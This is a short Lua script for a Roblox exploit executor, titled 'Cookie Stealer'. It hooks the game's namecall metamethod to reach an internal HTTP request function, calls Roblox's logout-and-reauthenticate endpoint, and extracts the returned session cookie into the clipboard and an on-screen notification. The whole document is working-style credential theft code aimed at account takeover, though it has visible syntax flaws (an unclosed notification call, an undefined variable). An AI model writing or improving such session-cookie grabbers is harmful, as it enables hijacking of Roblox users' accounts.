--Cookie Stealer
local HttpService
local RequestInternal
local Old 
Old = hookmetamethod(game, "__namecall", function(...)
    if not MessageBus then
        HttpService = game.GetService(game, "HttpService")
        RequestInternal = HttpService.RequestInternal
    end 
    return Old(...)
end)

task.wait(1)

RequestInternal(HttpService, {Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate/", Method = "POST", Body = ""}):Start(function(a,b) 
    if b then 
        Cookie = b.Headers["set-cookie"]:split(";")[1]
        setclipboard("Cookie Grabbed:", Cookie)
            wait(0.1)
        game.StarterGui:SetCore("SendNotification", {
        Title = "Test Cookie";
        Text = Cookie;
        Icon = "rbxassetid://13165941837";
        Duration = 5;
    end
end)
